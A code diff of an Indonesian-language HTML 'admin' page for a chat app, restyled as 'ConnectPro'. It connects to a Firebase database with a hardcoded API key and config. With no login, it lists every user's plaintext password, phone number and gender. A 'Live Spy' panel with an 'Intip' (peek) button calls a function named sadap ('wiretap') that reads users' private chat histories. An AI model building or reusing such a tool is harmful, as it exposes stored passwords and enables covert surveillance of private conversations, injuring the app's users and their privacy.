@@ -3,124 +3,160 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard Admin - Tanpa Login</title>
+    <title>Elite Admin - ConnectPro</title>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
         :root {
-            --bg: #020617; --card: #1e293b; --primary: #6366f1;
-            --danger: #ef4444; --text: #f8fafc; --border: #334155;
+            --bg: #0f172a; --card: rgba(30, 41, 59, 0.7);
+            --primary: #6366f1; --accent: #10b981;
+            --text-main: #f8fafc; --text-dim: #94a3b8;
+            --glass: blur(12px) saturate(180%);
         }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
 
         body {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            background: var(--bg); color: var(--text);
-            margin: 0; display: flex; flex-direction: column; height: 100vh;
+            background-color: var(--bg);
+            background-image: radial-gradient(circle at 0% 0%, rgba(99, 102, 241, 0.15) 0%, transparent 50%),
+                              radial-gradient(circle at 100% 100%, rgba(16, 185, 129, 0.1) 0%, transparent 50%);
+            color: var(--text-main);
+            height: 100vh; display: flex; overflow: hidden;
         }
 
-        header {
-            background: var(--card); padding: 20px 40px;
-            display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 2px solid var(--primary);
+        /* --- DESKTOP SIDEBAR --- */
+        nav.sidebar {
+            width: 260px; background: var(--card); backdrop-filter: var(--glass);
+            border-right: 1px solid rgba(255,255,255,0.1);
+            display: flex; flex-direction: column; padding: 30px 20px;
         }
 
-        .stats-grid {
-            display: grid; grid-template-columns: repeat(4, 1fr);
-            gap: 20px; padding: 20px 40px;
+        .logo { font-size: 1.5rem; font-weight: 800; color: var(--primary); margin-bottom: 40px; display: flex; align-items: center; gap: 10px; }
+
+        .nav-item {
+            padding: 12px 15px; border-radius: 12px; color: var(--text-dim);
+            text-decoration: none; margin-bottom: 10px; transition: 0.3s;
+            display: flex; align-items: center; gap: 12px; cursor: pointer;
+        }
+        .nav-item:hover, .nav-item.active { background: rgba(99, 102, 241, 0.1); color: var(--primary); }
+
+        /* --- MAIN CONTENT --- */
+        main { flex: 1; display: flex; flex-direction: column; overflow-y: auto; padding: 30px; }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card {
+            background: var(--card); backdrop-filter: var(--glass); padding: 25px;
+            border-radius: 24px; border: 1px solid rgba(255,255,255,0.1);
+        }
+        .stat-card h3 { font-size: 0.8rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; }
+        .stat-card p { font-size: 2rem; font-weight: 700; margin-top: 10px; }
+
+        .content-flex { display: flex; gap: 25px; flex-wrap: wrap; }
+        .data-table {
+            flex: 2; min-width: 350px; background: var(--card); border-radius: 24px;
+            padding: 25px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: var(--glass);
+        }
+        .spy-panel {
+            flex: 1; min-width: 300px; background: var(--card); border-radius: 24px;
+            padding: 25px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: var(--glass);
         }
 
-        .stat-box {
-            background: var(--card); padding: 20px; border-radius: 12px;
-            border: 1px solid var(--border); text-align: center;
+        /* --- TABLE STYLE --- */
+        .scroll-x { overflow-x: auto; margin-top: 20px; }
+        table { width: 100%; border-collapse: collapse; min-width: 600px; }
+        th { text-align: left; padding: 12px; color: var(--text-dim); font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.1); }
+        td { padding: 15px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+
+        .user-info { display: flex; align-items: center; gap: 10px; }
+        .user-info img { width: 38px; height: 38px; border-radius: 12px; object-fit: cover; }
+        .badge { padding: 4px 10px; border-radius: 8px; font-size: 0.7rem; font-weight: 600; }
+        .male { background: rgba(59, 130, 246, 0.2); color: #3b82f6; }
+        .female { background: rgba(236, 72, 153, 0.2); color: #ec4899; }
+
+        .btn-spy { background: var(--primary); border: none; color: white; padding: 8px 15px; border-radius: 10px; cursor: pointer; font-size: 0.8rem; }
+
+        /* --- MOBILE BOTTOM NAV --- */
+        .bottom-nav { display: none; position: fixed; bottom: 0; left: 0; width: 100%; background: var(--card); backdrop-filter: blur(20px); padding: 15px; border-top: 1px solid rgba(255,255,255,0.1); z-index: 100; justify-content: space-around; }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 768px) {
+            nav.sidebar { display: none; }
+            body { flex-direction: column; }
+            main { padding: 20px 15px 100px 15px; }
+            .bottom-nav { display: flex; }
+            .content-flex { flex-direction: column; }
+            .stat-card p { font-size: 1.5rem; }
         }
 
-        .stat-box h3 { margin: 0; font-size: 0.8rem; color: #94a3b8; text-transform: uppercase; }
-        .stat-box p { margin: 10px 0 0; font-size: 1.5rem; font-weight: 700; color: var(--primary); }
-
-        main {
-            display: grid; grid-template-columns: 1.5fr 1fr;
-            gap: 20px; padding: 0 40px 40px; flex: 1; overflow: hidden;
-        }
-
-        .container {
-            background: var(--card); border-radius: 16px;
-            display: flex; flex-direction: column; overflow: hidden;
-            border: 1px solid var(--border);
-        }
-
-        .container-header {
-            padding: 15px 20px; background: rgba(255,255,255,0.05);
-            font-weight: 700; border-bottom: 1px solid var(--border);
-        }
-
-        .scroll { flex: 1; overflow-y: auto; padding: 20px; }
-
-        table { width: 100%; border-collapse: collapse; }
-        th { text-align: left; padding: 10px; color: #94a3b8; font-size: 0.75rem; border-bottom: 1px solid var(--border); }
-        td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.85rem; }
-
-        .pfp { width: 35px; height: 35px; border-radius: 50%; object-fit: cover; }
-        .pw { font-family: monospace; color: #fbbf24; font-weight: bold; }
-        .tag { padding: 3px 7px; border-radius: 4px; font-size: 0.65rem; font-weight: bold; }
-        .Laki-laki { background: #1d4ed8; }
-        .Perempuan { background: #be185d; }
-
-        .btn-intip { background: var(--primary); border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer; }
-        .chat-log { background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 10px; font-size: 0.8rem; border-left: 3px solid var(--primary); }
+        /* Spy Box Styles */
+        .chat-row { background: rgba(15, 23, 42, 0.5); padding: 12px; border-radius: 15px; margin-bottom: 15px; border-left: 3px solid var(--primary); }
+        .chat-bubble { font-size: 0.85rem; margin-top: 5px; padding: 5px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
     </style>
 </head>
 <body>
 
-<header>
-    <div>
-        <h1 style="margin:0; font-size: 1.2rem;"><i class="fas fa-unlock-alt"></i> Dashboard Admin (Akses Langsung)</h1>
-        <small style="color: #94a3b8;">Memantau seluruh database user & percakapan</small>
-    </div>
-    <div style="font-size: 0.8rem; background: #334155; padding: 5px 15px; border-radius: 20px;">
-        <i class="fas fa-circle" style="color: #22c55e; font-size: 0.6rem;"></i> Server Aktif
-    </div>
-</header>
+    <nav class="sidebar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> ConnectPro</div>
+        <div class="nav-item active"><i class="fas fa-grid-2"></i> Dashboard</div>
+        <div class="nav-item"><i class="fas fa-user-group"></i> Users</div>
+        <div class="nav-item"><i class="fas fa-comment-dots"></i> Conversations</div>
+        <div class="nav-item"><i class="fas fa-gear"></i> Settings</div>
+    </nav>
 
-<div class="stats-grid">
-    <div class="stat-box"><h3>Total User</h3><p id="sUser">0</p></div>
-    <div class="stat-box"><h3>Laki-laki</h3><p id="sMale">0</p></div>
-    <div class="stat-box"><h3>Perempuan</h3><p id="sFemale">0</p></div>
-    <div class="stat-box"><h3>Data Akurat</h3><p>100%</p></div>
-</div>
-
-<main>
-    <div class="container">
-        <div class="container-header"><i class="fas fa-database"></i> Database User</div>
-        <div class="scroll">
-            <table>
-                <thead>
-                    <tr>
-                        <th>PFP</th>
-                        <th>ID / NAMA</th>
-                        <th>PASSWORD</th>
-                        <th>NO. HP</th>
-                        <th>GENDER</th>
-                        <th>AKSI</th>
-                    </tr>
-                </thead>
-                <tbody id="userTable"></tbody>
-            </table>
+    <main>
+        <div style="margin-bottom: 30px;">
+            <h1 style="font-size: 1.8rem; letter-spacing: -1px;">Admin Console</h1>
+            <p style="color: var(--text-dim);">Monitoring data user secara real-time.</p>
         </div>
-    </div>
 
-    <div class="container">
-        <div class="container-header"><i class="fas fa-eye"></i> Monitor Chat (Penyadapan)</div>
-        <div class="scroll" id="spyBox">
-            <p style="text-align: center; color: #64748b; margin-top: 50px;">Klik tombol "Intip" pada user untuk melihat chat mereka.</p>
+        <div class="stats-grid">
+            <div class="stat-card"><h3>Total User</h3><p id="tUser">0</p></div>
+            <div class="stat-card"><h3>Laki-laki</h3><p id="tMale" style="color: #3b82f6;">0</p></div>
+            <div class="stat-card"><h3>Perempuan</h3><p id="tFemale" style="color: #ec4899;">0</p></div>
         </div>
+
+        <div class="content-flex">
+            <div class="data-table">
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <h2 style="font-size: 1.1rem;">Database Pengguna</h2>
+                    <i class="fas fa-rotate" style="cursor:pointer; color:var(--text-dim);" onclick="location.reload()"></i>
+                </div>
+                <div class="scroll-x">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>USER INFO</th>
+                                <th>PASSWORD</th>
+                                <th>PHONE / WA</th>
+                                <th>GENDER</th>
+                                <th>ACTION</th>
+                            </tr>
+                        </thead>
+                        <tbody id="userTable"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div class="spy-panel">
+                <h2 style="font-size: 1.1rem; margin-bottom: 20px;"><i class="fas fa-satellite-dish"></i> Live Spy</h2>
+                <div id="spyOutput" style="color: var(--text-dim); font-size: 0.9rem;">
+                    Pilih user untuk mengintip isi chat.
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div class="bottom-nav">
+        <div onclick="location.reload()" style="color: var(--primary);"><i class="fas fa-home fa-lg"></i></div>
+        <div><i class="fas fa-users fa-lg"></i></div>
+        <div><i class="fas fa-eye fa-lg"></i></div>
+        <div onclick="alert('Admin Mode Active')"><i class="fas fa-user-gear fa-lg"></i></div>
     </div>
-</main>
 
 <script>
-    // Konfigurasi Firebase Anda
     const firebaseConfig = {
         apiKey: "AIzaSyBSo0nFUKNBDmUX0wSFV_idAFWBRnnTcXE",
         authDomain: "fotobooth-e36ab.firebaseapp.com",
@@ -133,7 +169,6 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // Ambil Data User secara Real-time
     db.ref('users').on('value', snap => {
         const table = document.getElementById('userTable');
         table.innerHTML = "";
@@ -143,56 +178,52 @@
             const d = user.val();
             const id = user.key;
             total++;
-            if(d.gender === 'Laki-laki') m++;
-            if(d.gender === 'Perempuan') f++;
+            if(d.gender === 'Laki-laki') m++; else f++;
 
             table.innerHTML += `
                 <tr>
-                    <td><img src="${d.pfp || 'https://via.placeholder.com/50'}" class="pfp"></td>
-                    <td><b>${id}</b><br><small>${d.nama}</small></td>
-                    <td class="pw">${d.pw}</td>
+                    <td>
+                        <div class="user-info">
+                            <img src="${d.pfp || 'https://via.placeholder.com/100'}">
+                            <div><b>${id}</b><br><small style="color:var(--text-dim)">${d.nama}</small></div>
+                        </div>
+                    </td>
+                    <td><code style="color:#fbbf24; font-weight:bold;">${d.pw}</code></td>
                     <td>${d.wa || '-'}</td>
-                    <td><span class="tag ${d.gender}">${d.gender || 'N/A'}</span></td>
-                    <td><button class="btn-intip" onclick="sadap('${id}')">Intip</button></td>
+                    <td><span class="badge ${d.gender}">${d.gender}</span></td>
+                    <td><button class="btn-spy" onclick="sadap('${id}')">Intip</button></td>
                 </tr>
             `;
         });
-        document.getElementById('sUser').innerText = total;
-        document.getElementById('sMale').innerText = m;
-        document.getElementById('sFemale').innerText = f;
+        document.getElementById('tUser').innerText = total;
+        document.getElementById('tMale').innerText = m;
+        document.getElementById('tFemale').innerText = f;
     });
 
-    // Fungsi Sadap Chat
     function sadap(id) {
-        const box = document.getElementById('spyBox');
-        box.innerHTML = `<h3>Riwayat Chat: <span style="color:var(--primary)">${id}</span></h3>`;
+        const out = document.getElementById('spyOutput');
+        out.innerHTML = `<p style="color:white; margin-bottom:15px;">Target: <b>@${id}</b></p>`;
         
         db.ref(`contacts/${id}`).once('value', snap => {
-            if(!snap.exists()) {
-                box.innerHTML += `<p>User ini belum memulai percakapan apa pun.</p>`;
-                return;
-            }
-
+            if(!snap.exists()) return out.innerHTML += "Tidak ada riwayat chat.";
+            
             snap.forEach(c => {
                 const partner = c.key;
                 const room = [id, partner].sort().join("_");
-                
-                const logDiv = document.createElement('div');
-                logDiv.className = 'chat-log';
-                logDiv.innerHTML = `<strong>Target chat dengan: ${partner}</strong><br>`;
+                const row = document.createElement('div');
+                row.className = 'chat-row';
+                row.innerHTML = `<small>Chat dengan: <b>${partner}</b></small>`;
 
-                db.ref(`messages/${room}`).once('value', mSnap => {
+                db.ref(`messages/${room}`).limitToLast(5).once('value', mSnap => {
                     mSnap.forEach(msg => {
                         const m = msg.val();
-                        const dari = m.sender === id ? "Dia" : "Lawan";
-                        logDiv.innerHTML += `<div style="margin-top:5px;"><b>${dari}:</b> ${m.text || '[Voice Note/Lainnya]'}</div>`;
+                        row.innerHTML += `<div class="chat-bubble"><b>${m.sender === id ? 'Dia' : 'Lawan'}:</b> ${m.text || '[VN/Media]'}</div>`;
                     });
                 });
-                box.appendChild(logDiv);
+                out.appendChild(row);
             });
         });
     }
 </script>
-
 </body>
-</html>
+    </html>
